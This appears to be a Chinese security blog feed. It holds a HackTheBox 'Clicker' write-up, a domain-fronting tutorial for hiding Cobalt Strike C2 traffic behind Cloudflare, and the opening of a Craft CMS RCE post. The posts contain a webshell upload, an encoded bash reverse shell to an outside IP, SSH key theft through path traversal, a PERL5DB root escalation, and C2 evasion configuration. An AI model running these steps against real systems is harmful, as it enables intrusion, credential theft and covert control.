<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">include_once(&quot;db_utils.php&quot;);</span><br><span class="line"></span><br><span class="line">if (isset($_SESSION[&#x27;PLAYER&#x27;]) &amp;&amp; $_SESSION[&#x27;PLAYER&#x27;] != &quot;&quot;) &#123;</span><br><span class="line">	$args = [];</span><br><span class="line">	foreach($_GET as $key=&gt;$value) &#123;</span><br><span class="line">		if (strtolower($key) === &#x27;role&#x27;) &#123;</span><br><span class="line">			// prevent malicious users to modify role</span><br><span class="line">			header(&#x27;Location: /index.php?err=Malicious activity detected!&#x27;);</span><br><span class="line">			die;</span><br><span class="line">		&#125;</span><br><span class="line">		$args[$key] = $value;</span><br><span class="line">	&#125;</span><br><span class="line">	save_profile($_SESSION[&#x27;PLAYER&#x27;], $_GET);</span><br><span class="line">	// update session info</span><br><span class="line">	$_SESSION[&#x27;CLICKS&#x27;] = $_GET[&#x27;clicks&#x27;];</span><br><span class="line">	$_SESSION[&#x27;LEVEL&#x27;] = $_GET[&#x27;level&#x27;];</span><br><span class="line">	header(&#x27;Location: /index.php?msg=Game has been saved!&#x27;);	</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>简单分析一下，可以通过foreach对GET参数进行遍历，如果<code>$key</code>不为role（不区分大小写），那么<code>$args[$key] = $value;</code>进行赋值，调用save_profile函数去更新session，修改成功则返回<code>Game has been saved!</code></p>
<p>这里我们搜索一下<code>$_SESSION[&#39;PLAYER&#39;]</code>是怎么来的，发现是由username决定的也就是登陆者身份</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110164127075.png"></p>
<p>那么我们可以借助GET传参<code>role=Admin</code>来更新并得到admin的session，但要绕过<code>if (strtolower($key) === &#39;role&#39;)</code>判断</p>
<p>这里本地测试发现，利用换行符<code>%0a</code>就行了</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110200952730.png"></p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>我们随便注册登录后点击play进入游戏，然后save的时候抓包</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110165933805.png"></p>
<p>放行，提示修改成功</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110165957356.png"></p>
<p>然后退出重新登录，发现多了一个功能</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110170626598.png"></p>
<p>点进去看看发现有四个用户</p>
<p>有个导出表格export选项，点击得到保存的路径</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110170802276.png"></p>
<p>访问一下</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110170946574.png"></p>
<p>我们抓包看看保存的过程发现拓展名可控</p>
<p>尝试修改为php成功</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110171226227.png"></p>
<p>既然可以修改为php后缀，那么我们寻找下写马的位置。很明显，保存的数据中只有nickname可以让我们写马，而如何修改nickname的值就和刚刚修改role一样的办法</p>
<p>点击play，然后save的时候抓包</p>
<p>（注意<code>?</code>要url编码一下）</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110172332221.png"></p>
<p>然后还是一样回显保存成功，那么说明成功写入马</p>
<p>继续按照刚刚那样抓包修改导出拓展名为php，然后访问保存路径成功RCE</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110172633202.png"></p>
<p>我们将反弹shell命令url编码一下，然后执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E14%2E74%2F1028%200%3E%261%22</span><br></pre></td></tr></table></figure>

<p>成功反弹shell</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110172943982.png"></p>
<p>我们尝试访问<code>/home/jack</code>发现不行，接着在<code>/opt/manage</code>发现可疑文件</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110175535438.png"></p>
<p>貌似是二进制文件execute_query的使用说明</p>
<p>我们在连接的靶机开启http服务，使用wget命令下载下来该二进制文件</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110190318094.png"></p>
<p>然后丢到ida里F5反编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int result; // eax</span><br><span class="line">  size_t v4; // rbx</span><br><span class="line">  size_t v5; // rax</span><br><span class="line">  size_t v6; // rbx</span><br><span class="line">  size_t v7; // rax</span><br><span class="line">  int v8; // [rsp+10h] [rbp-B0h]</span><br><span class="line">  char *dest; // [rsp+18h] [rbp-A8h]</span><br><span class="line">  char *name; // [rsp+20h] [rbp-A0h]</span><br><span class="line">  char *command; // [rsp+28h] [rbp-98h]</span><br><span class="line">  char s[32]; // [rsp+30h] [rbp-90h] BYREF</span><br><span class="line">  char src[88]; // [rsp+50h] [rbp-70h] BYREF</span><br><span class="line">  unsigned __int64 v14; // [rsp+A8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(0x28u);</span><br><span class="line">  if ( argc &gt; 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = atoi(argv[1]);</span><br><span class="line">    dest = (char *)calloc(0x14uLL, 1uLL);</span><br><span class="line">    switch ( v8 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 0:</span><br><span class="line">        puts(&quot;ERROR: Invalid arguments&quot;);</span><br><span class="line">        return 2;</span><br><span class="line">      case 1:</span><br><span class="line">        strncpy(dest, &quot;create.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 2:</span><br><span class="line">        strncpy(dest, &quot;populate.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 3:</span><br><span class="line">        strncpy(dest, &quot;reset_password.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      case 4:</span><br><span class="line">        strncpy(dest, &quot;clean.sql&quot;, 0x14uLL);</span><br><span class="line">        goto LABEL_10;</span><br><span class="line">      default:</span><br><span class="line">        strncpy(dest, argv[2], 0x14uLL);</span><br><span class="line">LABEL_10:</span><br><span class="line">        strcpy(s, &quot;/home/jack/queries/&quot;);</span><br><span class="line">        v4 = strlen(s);</span><br><span class="line">        v5 = strlen(dest);</span><br><span class="line">        name = (char *)calloc(v4 + v5 + 1, 1uLL);</span><br><span class="line">        strcat(name, s);</span><br><span class="line">        strcat(name, dest);</span><br><span class="line">        setreuid(0x3E8u, 0x3E8u);</span><br><span class="line">        if ( access(name, 4) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;File not readable or not found&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          strcpy(src, &quot;/usr/bin/mysql -u clicker_db_user --password=&#x27;clicker_db_password&#x27; clicker -v &lt; &quot;);</span><br><span class="line">          v6 = strlen(src);</span><br><span class="line">          v7 = strlen(dest);</span><br><span class="line">          command = (char *)calloc(v6 + v7 + 1, 1uLL);</span><br><span class="line">          strcat(command, src);</span><br><span class="line">          strcat(command, name);</span><br><span class="line">          system(command);</span><br><span class="line">        &#125;</span><br><span class="line">        result = 0;</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;ERROR: not enough arguments&quot;);</span><br><span class="line">    return 1;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后就卡住了，于是参考下国外师傅写的<a href="https://medium.com/@depradip_8731/clicker-htb-writeup-walkthrough-f9bc00b57dee">wp</a>是去读取了jack的id_rsa私钥</p>
<p>这里的参数5是因为在上述代码中如果不为1234中的一个，就会执行第三个命令行参数 <code>argv[2]</code> 的内容复制到 <code>dest</code> 变量中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">default:</span><br><span class="line">    strncpy(dest, argv[2], 0x14uLL);</span><br></pre></td></tr></table></figure>

<p>然后拼接文件路径，然后检查文件是否可读。如果文件不可读或者不存在，程序会输出 “File not readable or not found”。否则，将会构建一个 MySQL 命令并执行它，因为拼接的路径为<code>/home/jack/queries/</code>，所以要先返回上一级目录</p>
<p>payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./execute_query 5 ../.ssh/id_rsa</span><br></pre></td></tr></table></figure>

<p>成功读取</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110180639183.png"></p>
<p>将这一长串保存下来命名为id_rsa</p>
<p>由于为了确保私钥的安全性，私钥文件应该只对所有者有读写权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>

<p>然后注意OpenSSH内容格式不对，所以将三个<code>-</code>修改为五个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAAB...</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>直接ssh连接，得到user的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa jack@10.10.11.232</span><br></pre></td></tr></table></figure>

<p><img src="/article/Clicker-HackTheBox/image-20240110184119487.png"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们sudo发现有monitor.sh，然后cat看下具体内容</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110184926380.png"></p>
<p>这里注意到两个文件<code>/usr/bin/xml_pp</code>和<code>/usr/bin/echo</code>（后者并没有什么特殊用处）</p>
<p>而我们跟进<code>/usr/bin/xml_pp</code>发现是perl脚本运行</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110185423524.png"></p>
<p>通过搜索得知一种名为perl_startup的提权方式 <a href="https://www.exploit-db.com/exploits/39702">参考文章</a></p>
<p>我们直接给monitor.sh赋予<code>/bin/bash</code>权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo PERL5OPT=-d PERL5DB=&#x27;exec &quot;chmod u+s /bin/bash&quot;&#x27; /opt/monitor.sh</span><br><span class="line">//u+s表示给user用户添加权限，即/bin/bash</span><br></pre></td></tr></table></figure>

<p>然后再<code>bash -p</code>即可（用于启用特权模式（privileged mode）的一个选项，保留有效用户的特权和权限）</p>
<p>得到root的flag</p>
<p><img src="/article/Clicker-HackTheBox/image-20240110185919717.png"></p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>HackTheBox</tag>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>Domain fronting域名前置攻击</title>
    <url>/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB.html</url>
    <content><![CDATA[<p>红队隐藏恶意流量的小技巧</p>
<span id="more"></span>

<h1 id="Domain-fronting域名前置攻击"><a href="#Domain-fronting域名前置攻击" class="headerlink" title="Domain fronting域名前置攻击"></a>Domain fronting域名前置攻击</h1><h2 id="什么是域前置"><a href="#什么是域前置" class="headerlink" title="什么是域前置"></a>什么是域前置</h2><p>Domain Fronting基于HTTPS通用规避技术，也被称为域前端网络攻击技术。这是一种用来隐藏Metasploit，Cobalt Strike等团队控制服务器流量，以此来一定程度绕过检查器或防火墙检测的技术，如Amazon ,Google，Akamai  等大型厂商会提供一些域前端技术服务。</p>
<h2 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>在虚拟主机中搭建多个网站服务，为了方便我们区分它们，可以 IP+Port名称 等方式去访问它们,但是如果是SSL&#x2F;TLS的话。根据HTTPS的工作原理，浏览器在访问一个HTTPS站点时，先与服务器建立SSL连接。</p>
<p>建立连接的第一步就是请求服务器的证书。而服务器在发送证书时，是不知道浏览器访问的是哪个域名的，所以不能根据不同域名发送不同的证书。因此就引入一个扩展叫SNI，SNI是为了解决一个服务器使用多个域名和证书的SSL&#x2F;TLS扩展，做法就是在 Client Hello 中补上 Host 信息。</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240918085031643.png"></p>
<p>域前置的关键思想是在不同的通信层使用不同的域名，是一种隐藏连接真实端点来规避互联网审查的技术。在应用层上运作时，域前置使用户能通过HTTPS连接到被屏蔽的服务，而表面上像在与另一个完全不同的站点通信。</p>
<p><strong>此技术的原理为在不同通信层使用不同的域名。</strong>在明文的DNS请求和TLS服务器名称指示（SNI）中使用无害的域名来初始化连接，而实际要连接的被封锁域名仅在创建加密的HTTPS连接后发出，在Host头中携带了另一个恶意C2域名（Host头对于检查器是不可见的，但是对于接收HTTPS请求的前端服务器是可见的）。</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240919192537815.png"></p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><ul>
<li>c2 服务器：cs 4.3</li>
<li>服务器端：Ubuntu 22.04</li>
<li>客户端：kali 2023.2</li>
<li>靶机：win10</li>
</ul>
<h3 id="注册申请相关"><a href="#注册申请相关" class="headerlink" title="注册申请相关"></a>注册申请相关</h3><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>域名可以在硅云上购买，官网链接：<code>https://www.vpsor.cn/</code></p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240929201453451.png"></p>
<p>由于我们只是进行域前置攻击的实验，随便挑一个免费的就可以。</p>
<p>注册好后跳转到域名控制面板，添加上<code>www</code>主机名的解析记录（即<code>www.rev1.fun</code>）</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930172732284.png"></p>
<p>然后我们访问一下，解析成功</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930172901359.png"></p>
<h4 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h4><p>在DK盾买的香港服务器</p>
<h4 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h4><p>CDN就用Cloudfare的，然后点击主页的添加站点，把根域名添加进去</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930172554473.png"></p>
<p>选择免费的计划即可，点击继续提示要更改权威服务器名称</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930173133082.png"></p>
<h3 id="CDN绑定域名"><a href="#CDN绑定域名" class="headerlink" title="CDN绑定域名"></a>CDN绑定域名</h3><p>回到硅云的域名控制面板，找到修改域名DNS处后将上面分配的服务器名称复制上去</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930173219508.png"></p>
<p>等个几分钟Cloudfare会发邮件给我们，表示已经绑定上了他的权威名称服务器，说明可以添加DNS解析记录了</p>
<h3 id="设置解析配置"><a href="#设置解析配置" class="headerlink" title="设置解析配置"></a>设置解析配置</h3><p>选中导航栏的DNS，添加A记录为我们的VPS的IP</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930175139552.png"></p>
<p>然后点击概述界面的快速入门指南</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930175336061.png"></p>
<p>将重写HTTPS功能关掉</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930175453909.png"></p>
<p>继续关闭始终使用HTTPS，最后点击完成即可</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930175520874.png"></p>
<p>启用开发模式来禁用缓存</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930175744357.png"></p>
<p>SSL证书加密选择为灵活模式</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930175803963.png"></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>访问域名成功解析HTTPS</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930175842115.png"></p>
<p>我们在本地ping一下域名，会发现ip不是我们vps的</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930180056079.png"></p>
<p>查ip发现是Cloudflare的，成功给我们域名套上CDN</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930180151688.png"></p>
<h2 id="C2服务器配置-流量混淆"><a href="#C2服务器配置-流量混淆" class="headerlink" title="C2服务器配置 流量混淆"></a>C2服务器配置 流量混淆</h2><p>由于Cobalt Strike上线的流量包非常明显，很容易被防守方捕获数据包并溯源，所以我们配置证书以及profile文件来实现流量混淆。</p>
<h3 id="证书配置"><a href="#证书配置" class="headerlink" title="证书配置"></a>证书配置</h3><p>回到cloudflare找到SSL证书的源服务器</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930180640770.png"></p>
<p>选择ECC加密生成私钥</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930180723632.png"></p>
<p>点击创建，然后继续往下得到证书和私钥文件内容</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930180832834.png"></p>
<p>我们分别导入并修改文件名为<code>www.rev1.fun.pem</code>和<code>www.rev1.fun.key</code>，将创建的pem和key文件上传至cs文件夹下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -export -in www.rev1.fun.pem -inkey www.rev1.fun.key -out www.rev1.fun.p12 -name www.rev1.fun -passout pass:123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore www.rev1.fun.store -srckeystore www.rev1.fun.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias www.rev1.fun</span><br></pre></td></tr></table></figure>

<p>最后会生成一个<code>www.rev1.fun.store</code>文件。其中文件有个坑，cs的store的默认密码是123456所以我这边都保持一致免得出错。</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930181952625.png"></p>
<h3 id="profile文件配置"><a href="#profile文件配置" class="headerlink" title="profile文件配置"></a>profile文件配置</h3><p>GitHub上有很多，根据cs不同版本来选即可。项目地址：<code>https://github.com/threatexpress/malleable-c2</code></p>
<p>我这里用的是4.3版本，需要修改下面几个地方</p>
<h4 id="https-certificate"><a href="#https-certificate" class="headerlink" title="https-certificate"></a>https-certificate</h4><p>打开下载好的jquery-Profile，找到https-certificate模块中的<code>keystore</code>和<code>password</code>，修改后把注释去掉</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930182117689.png"></p>
<h4 id="http-stager"><a href="#http-stager" class="headerlink" title="http-stager"></a>http-stager</h4><p>修改http-stager 中的Host和Referer及Content-Type</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// server 中 Content-Type</span><br><span class="line">header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;</span><br><span class="line">修改为：</span><br><span class="line">header &quot;Content-Type&quot; &quot;application/*; charset=utf-8&quot;;</span><br><span class="line"></span><br><span class="line">// client Host和Referer，记得去掉注释</span><br></pre></td></tr></table></figure>

<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930182221596.png"></p>
<h4 id="http-get"><a href="#http-get" class="headerlink" title="http-get"></a>http-get</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// server 中 Content-Type</span><br><span class="line">header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;</span><br><span class="line">修改为：</span><br><span class="line">header &quot;Content-Type&quot; &quot;application/*; charset=utf-8&quot;;</span><br><span class="line"></span><br><span class="line">// client Host和Referer，记得去掉注释</span><br></pre></td></tr></table></figure>

<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930182313662.png"></p>
<h4 id="http-post"><a href="#http-post" class="headerlink" title="http-post"></a>http-post</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// server 中 Content-Type</span><br><span class="line">header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;;</span><br><span class="line">修改为：</span><br><span class="line">header &quot;Content-Type&quot; &quot;application/*; charset=utf-8&quot;;</span><br><span class="line"></span><br><span class="line">// client Host和Referer，记得去掉注释</span><br></pre></td></tr></table></figure>

<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930182353421.png"></p>
<p>在这个Profile中，我们请求的URI是以.js结尾的，Cloudflare作为一个CDN肯定要去缓存它，但这样的话请求就无法到达我们的CS服务器，自然也就无法上线了。使用开发模式并清除缓存（这个只能缓存两个小时）</p>
<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>将修改的jquery-c2.4.3.profile 上传vps的cs文件夹下，在修改完成后，使用CS自带的c2lint对profile语法进行检查</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./c2lint jquery-c2.4.3.profile</span><br></pre></td></tr></table></figure>

<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930182453441.png"></p>
<h2 id="Cobalt-Strike上线"><a href="#Cobalt-Strike上线" class="headerlink" title="Cobalt Strike上线"></a>Cobalt Strike上线</h2><p>为了可以交互cs流量，先在服务器上关闭防火墙ufw</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl stop ufw</span><br></pre></td></tr></table></figure>

<p>然后启动服务端并使用我们刚刚修改的profile配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./teamserver 156.238.233.68 root jquery-c2.4.3.profile</span><br></pre></td></tr></table></figure>

<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240918140054896.png"></p>
<p>在我们的攻击机kali启动客户端，进行连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./start.sh</span><br></pre></td></tr></table></figure>

<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930184107757.png"></p>
<p>创建HTTPS监听器添加上我们的C2服务器域名， 这边需要注意Cloudflare只支持监听以下端口：</p>
<ul>
<li>HTTP端口：80,8080,8880,2052,2082,2086,2095</li>
<li>HTTPS端口：443,2053,2083,2087,2096,8443</li>
</ul>
<p>注意：如果VPS是国内云主机，且注册的免费域名没有备案，则不能使用80、8080、443、8443端口提供服务，否则会被拦截提示备案才能访问。</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930184707148.png"></p>
<p>创建好后生成后门程序，选择我们创建的监听器点击x64的payload</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930192542063.png"></p>
<p>我们拿win10作为靶机，为了方便演示我们直接连上蚁剑上传后门程序</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930192618970.png"></p>
<p>Cobalt Strike成功上线</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930194513846.png"></p>
<p>我们再来看下靶机win10抓取的流量，注意域名被成功解析</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930194625520.png"></p>
<p>由于是HTTPS的监听器，我们看不到http的流量并且https的流量是加密过的，那么我们可以再创建个HTTP监听器进行验证</p>
<blockquote>
<p>注：域前置是跟HTTPS来进行配合的，这里只是方便我们验证是否成功隐藏我们C2服务器的域名。至于为什么和HTTPS配合，是因为除非逆向程序获取host头信息，否则无法获取到真实连接域名</p>
</blockquote>
<p>重新创建个监听器，端口为2052</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930195139476.png"></p>
<p>然后和之前一样生成后门程序，蚁剑上传后执行，成功上线</p>
<p>继续抓取下http流量，这里我们可以看到上线的cs流量包变成我们修改的profile文件，这样就可以避免默认流量特征被识别</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930195611345.png"></p>
<p>并且查询IP为cloudflare运营商的，成功隐藏</p>
<p><img src="/article/Domain-fronting%E5%9F%9F%E5%90%8D%E5%89%8D%E7%BD%AE%E6%94%BB%E5%87%BB/image-20240930195732926.png"></p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&tid=71715">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=71715</a></li>
<li><a href="https://www.cnblogs.com/0xl4k1d/p/15643269.html">https://www.cnblogs.com/0xl4k1d/p/15643269.html</a></li>
<li><a href="https://xz.aliyun.com/t/4509?time__1311=n4+xni0Qi=dCq0KAq05DK32xmO8iDBjmDxmTID">https://xz.aliyun.com/t/4509?time__1311=n4%2Bxni0Qi%3DdCq0KAq05DK32xmO8iDBjmDxmTID</a></li>
<li><a href="http://chen.oinsm.com/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/">http://chen.oinsm.com/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/</a></li>
<li><a href="https://fz1lin.com/2022/937989325/">https://fz1lin.com/2022/937989325/</a></li>
<li><a href="https://zone.huoxian.cn/d/733-aptcsc2-profilecdn">https://zone.huoxian.cn/d/733-aptcsc2-profilecdn</a></li>
<li><a href="https://paper.seebug.org/1349/">https://paper.seebug.org/1349/</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>域前置</tag>
        <tag>Cobalt Strike</tag>
      </tags>
  </entry>
  <entry>
    <title>Craft CMS远程代码执行漏洞</title>
    <url>/article/Craft-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<p>挺有意思的洞，就是PHP8调试配置问题比较折磨人</p>
<span id="more"></span>

<h1 id="Craft-CMS远程代码执行漏洞"><a href="#Craft-CMS远程代码执行漏洞" class="headerlink" title="Craft CMS远程代码执行漏洞"></a>Craft CMS远程代码执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p><strong>漏洞编号：CVE-2023-41892</strong></p>
<p>Craft CMS是一个创建数字体验的平台。这是一种高影响、低复杂性的攻击媒介。建议在 4.4.15 之前运行 Craft 安装的用户至少更新到该版本以缓解此问题。Craft CMS&lt;4.4.15 版本存在远程代码执行 （RCE）漏洞，攻击者通过在受攻击系统上执行恶意命令，从而获取未授权的系统访问权限。此问题已在 4.4.15 中修复。</p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>4.0.0-RC1 &lt;&#x3D; Craft CMS &lt;&#x3D; 4.4.14</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>测试工具：phpstudy+vscode，测试版本：Craft CMS4.4.14 + php8.0.2 + MySQL5.7.26</p>
</blockquote>
<p>源码链接：<code>https://github.com/craftcms/cms/releases/</code></p>
<p>打开phpstudy创建网站以及数据库</p>
